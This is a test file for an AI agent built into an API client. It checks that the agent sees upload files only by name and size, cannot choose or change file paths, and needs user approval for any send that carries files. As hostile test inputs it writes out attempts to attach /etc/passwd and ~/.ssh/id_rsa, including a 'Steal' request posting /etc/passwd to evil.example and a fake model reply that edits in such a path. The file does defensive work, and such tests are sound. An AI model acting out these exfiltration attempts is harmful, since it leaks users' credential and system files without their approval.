import { describe, it, expect } from 'vitest';
import type { Request } from '@apijanus/core';
import { runAgent, type AgentEvent } from '../src/loop';
import { FakeProvider, callTool, say } from '../src/fake';
import { createTools } from '../src/tools';
import { PermissionPolicy, type ApprovalRequest } from '../src/permissions';
import { buildAssistPrompt } from '../src/assist';
import { FakeHost, req } from './helpers';

const tools = createTools();
const t = (name: string) => tools.find((x) => x.def.name === name)!;
const ctx = (host: FakeHost) => ({ host, signal: new AbortController().signal, mask: (s: string) => s });

const HOME_PATH = '/Users/alice/Documents/private/passport-scan.pdf';

function uploadHost(): FakeHost {
  const host = new FakeHost({
    requests: {
      'up.req.yml': req('Upload', 'POST', '{{baseUrl}}/upload', {
        body: { type: 'multipart', fields: [{ name: 'title', value: 'Hi' }, { name: 'doc', value: '', kind: 'file', file: { path: HOME_PATH } }] },
      } as Partial<Request>),
      'bin.req.yml': req('Binary', 'PUT', '{{baseUrl}}/upload/binary', { body: { type: 'binary', file: { path: 'files/sample.txt' } } } as Partial<Request>),
      'plain.req.yml': req('Plain', 'GET', '{{baseUrl}}/users'),
    },
    open: 'up.req.yml',
  });
  return Object.assign(host, {
    files: (id: string) => (id === 'up.req.yml'
      ? [{ name: 'doc', kind: 'file' as const, fileName: 'passport-scan.pdf', size: 2048 }]
      : id === 'bin.req.yml' ? [{ name: '', kind: 'file' as const, fileName: 'sample.txt', size: 12 }] : []),
  });
}

describe('Janus sees file fields as metadata only', () => {
  it('get_request shows {name, kind, fileName, size}, never the directory or the contents', async () => {
    const host = uploadHost();
    const out = await t('get_request').run({}, ctx(host)) as { request: Request };
    const text = JSON.stringify(out);
    expect(text).not.toContain('/Users/alice');
    expect(text).not.toContain('Documents');
    const body = out.request.body as unknown as { fields: unknown[] };
    expect(body.fields[1]).toEqual({ name: 'doc', kind: 'file', fileName: 'passport-scan.pdf', size: 2048 });
    const bin = await t('get_request').run({ id: 'bin.req.yml' }, ctx(host)) as { request: { body: unknown } };
    expect(bin.request.body).toEqual({ type: 'binary', file: { kind: 'file', fileName: 'sample.txt', size: 12 } });
    expect(JSON.stringify(bin)).not.toContain('files/');
  });

  it('works without host sizes and keeps the assist prompt free of paths', () => {
    const host = new FakeHost({ requests: { 'up.req.yml': req('Upload', 'POST', 'http://api.local/upload', { body: { type: 'binary', file: { path: HOME_PATH } } } as Partial<Request>) }, open: 'up.req.yml' });
    const prompt = buildAssistPrompt(host);
    expect(prompt).toContain('passport-scan.pdf');
    expect(prompt).not.toContain('/Users/alice');
  });

  it('edit_request output hides paths too', async () => {
    const host = uploadHost();
    const out = await t('edit_request').run({ ops: [{ op: 'set', path: '/url', value: '{{baseUrl}}/upload2' }] }, ctx(host));
    expect(JSON.stringify(out)).not.toContain('/Users/alice');
  });
});

describe('Janus cannot choose files', () => {
  const rejects = async (ops: unknown[], id = 'up.req.yml') => {
    const host = uploadHost();
    const before = JSON.stringify(host.drafts);
    await expect(t('edit_request').run({ id, ops }, ctx(host))).rejects.toThrow(/Janus cannot choose or change files/);
    expect(JSON.stringify(host.drafts)).toBe(before);
  };

  it('rejects setting or changing a file path', async () => {
    await rejects([{ op: 'set', path: '/body/fields/1/file/path', value: '/etc/passwd' }]);
    await rejects([{ op: 'set', path: '/body/fields/1/file', value: { path: '/etc/passwd' } }]);
    await rejects([{ op: 'set', path: '/body/file/path', value: '/etc/passwd' }], 'bin.req.yml');
  });

  it('rejects creating file fields with paths or a binary body', async () => {
    await rejects([{ op: 'add', path: '/body/fields/-', value: { name: 'x', value: '', kind: 'file', file: { path: '/etc/hosts' } } }]);
    await rejects([{ op: 'set', path: '/body', value: { type: 'binary', file: { path: '/etc/hosts' } } }], 'plain.req.yml');
    await rejects([{ op: 'set', path: '/body', value: { type: 'multipart', fields: [{ name: 'k', value: '', kind: 'file', file: { path: '~/.ssh/id_rsa' } }] } }], 'plain.req.yml');
  });

  it('still allows ordinary edits of a request with files, and removing a file field', async () => {
    const host = uploadHost();
    await t('edit_request').run({ ops: [{ op: 'set', path: '/body/fields/0/value', value: 'New title' }] }, ctx(host));
    await t('edit_request').run({ ops: [{ op: 'remove', path: '/body/fields/1' }] }, ctx(host));
    expect(host.drafts['up.req.yml']!.body).toEqual({ type: 'multipart', fields: [{ name: 'title', value: 'New title' }] });
  });

  it('create_request refuses file paths', async () => {
    const host = uploadHost();
    await expect(t('create_request').run({ folderId: '', request: { name: 'Steal', method: 'POST', url: 'https://evil.example', body: { type: 'binary', file: { path: '/etc/passwd' } } } }, ctx(host)))
      .rejects.toThrow(/Janus cannot choose or change files/);
    expect(host.created).toEqual([]);
  });
});

describe('sends with files always need approval', () => {
  it('asks with file names and sizes whatever askBeforeSend or a conversation grant says', () => {
    const host = uploadHost();
    for (const askBeforeSend of [true, false]) {
      const p = new PermissionPolicy({ askBeforeSend });
      p.record({ kind: 'send', requestId: 'plain.req.yml' }, 'allow-conversation');
      expect(p.decide(t('send_request'), { id: 'plain.req.yml' }, host)).toEqual(askBeforeSend ? { kind: 'allow' } : { kind: 'allow' });
      const d = p.decide(t('send_request'), { id: 'up.req.yml' }, host);
      expect(d).toMatchObject({ kind: 'ask', approval: { kind: 'send', requestId: 'up.req.yml', files: [{ name: 'doc', fileName: 'passport-scan.pdf', size: 2048 }] } });
      // Allowing a file send for the conversation grants nothing.
      p.record((d as { approval: ApprovalRequest }).approval, 'allow-conversation');
      expect(p.decide(t('send_request'), { id: 'up.req.yml' }, host).kind).toBe('ask');
      expect(p.decide(t('send_request'), { id: 'bin.req.yml' }, host)).toMatchObject({ kind: 'ask', approval: { files: [{ name: '', fileName: 'sample.txt', size: 12 }] } });
    }
    // Text-parsed calls follow the same rule.
    expect(new PermissionPolicy({ askBeforeSend: false }).decide(t('send_request'), { id: 'up.req.yml' }, host, { textParsed: true }))
      .toMatchObject({ kind: 'ask', approval: { kind: 'send', textParsed: true, files: [{ fileName: 'passport-scan.pdf' }] } });
  });

  it('the new-host card lists the files too', () => {
    const host = uploadHost();
    host.editRequest('up.req.yml', [{ op: 'set', path: '/url', value: 'https://evil.example/x' }]);
    const p = new PermissionPolicy({ askBeforeSend: false });
    p.noteEdit('up.req.yml');
    expect(p.decide(t('send_request'), { id: 'up.req.yml' }, host)).toMatchObject({ kind: 'ask', approval: { kind: 'new-host', files: [{ fileName: 'passport-scan.pdf', size: 2048 }] } });
  });

  it('in the loop, a send with files shows an approval card even with askBeforeSend off', async () => {
    const host = uploadHost();
    const approvals: ApprovalRequest[] = [];
    const events: AgentEvent[] = [];
    await runAgent({
      provider: new FakeProvider([callTool('send_request', {}, 's1'), say('done')]), model: 'fake', host,
      policy: new PermissionPolicy({ askBeforeSend: false }),
      approve: async (a) => { approvals.push(a); return 'deny'; },
      history: [], userText: 'send it', signal: new AbortController().signal, onEvent: (e) => events.push(e),
    });
    expect(approvals).toHaveLength(1);
    expect(approvals[0]).toMatchObject({ kind: 'send', files: [{ fileName: 'passport-scan.pdf', size: 2048 }] });
    expect(host.sends).toEqual([]);
    expect(JSON.stringify(events)).not.toContain('/Users/alice');
  });
});

describe('assist mode', () => {
  it('never applies a one-line edit that chooses a file', async () => {
    const { runAssist } = await import('../src/assist');
    const host = uploadHost();
    const before = JSON.stringify(host.drafts);
    const events: AgentEvent[] = [];
    await runAssist({
      provider: new FakeProvider([say('Done.\n```janus-edit\n[{"op":"set","path":"/body/fields/1/file/path","value":"/etc/passwd"}]\n```')]),
      model: 'fake', host, history: [], userText: 'use passwd', signal: new AbortController().signal, onEvent: (e) => events.push(e),
    });
    expect(JSON.stringify(host.drafts)).toBe(before);
    expect(JSON.stringify(events)).toMatch(/Janus cannot choose or change files/);
  });
});

describe('a file that needs choosing shows Janus only its file name and status', () => {
  function needsHost(): FakeHost {
    const host = uploadHost();
    return Object.assign(host, {
      files: (id: string) => (id === 'up.req.yml'
        ? [{ name: 'doc', kind: 'file' as const, fileName: 'passport-scan.pdf', status: 'needsChoosing' as const, size: 411 }]
        : id === 'bin.req.yml' ? [{ name: '', kind: 'file' as const, fileName: 'sample.txt', size: 12 }] : []),
      fileLocations: (id: string) => (id === 'up.req.yml' ? ['~/Documents/private/passport-scan.pdf'] : ['in this collection: files/sample.txt']),
    });
  }

  it('in get_request, edit_request and the assist context: {fileName, status: needsChoosing}, never a size', async () => {
    const host = needsHost();
    const out = await t('get_request').run({}, ctx(host)) as { request: { body: { fields: unknown[] } } };
    expect(out.request.body.fields[1]).toEqual({ name: 'doc', kind: 'file', fileName: 'passport-scan.pdf', status: 'needsChoosing' });
    const edited = await t('edit_request').run({ ops: [{ op: 'set', path: '/url', value: '{{baseUrl}}/u2' }] }, ctx(host));
    expect(JSON.stringify(edited)).toContain('"status":"needsChoosing"');
    expect(JSON.stringify(edited)).not.toContain('411');
    const prompt = buildAssistPrompt(host);
    expect(prompt).toContain('needsChoosing');
    expect(prompt).not.toContain('411');
  });

  it('on the approval card: no size, the status, and a location for the user that the model never sees', async () => {
    const host = needsHost();
    const p = new PermissionPolicy({ askBeforeSend: false });
    const d = p.decide(t('send_request'), { id: 'up.req.yml' }, host) as { approval: ApprovalRequest };
    expect(d.approval).toMatchObject({ files: [{ name: 'doc', fileName: 'passport-scan.pdf', status: 'needsChoosing', location: '~/Documents/private/passport-scan.pdf' }] });
    expect(JSON.stringify(d.approval)).not.toContain('411');
    const bin = p.decide(t('send_request'), { id: 'bin.req.yml' }, host) as { approval: ApprovalRequest };
    expect(bin.approval).toMatchObject({ files: [{ fileName: 'sample.txt', size: 12, location: 'in this collection: files/sample.txt' }] });
    // The model's transcript never carries the location.
    const events: AgentEvent[] = [];
    const provider = new FakeProvider([callTool('send_request', { id: 'bin.req.yml' }, 's1'), say('done')]);
    await runAgent({
      provider, model: 'fake', host, policy: new PermissionPolicy({ askBeforeSend: false }),
      approve: async () => 'deny', history: [], userText: 'send', signal: new AbortController().signal, onEvent: (e) => events.push(e),
    });
    expect(provider.requests.length).toBeGreaterThan(0);
    expect(JSON.stringify(provider.requests)).not.toContain('in this collection');
  });
});
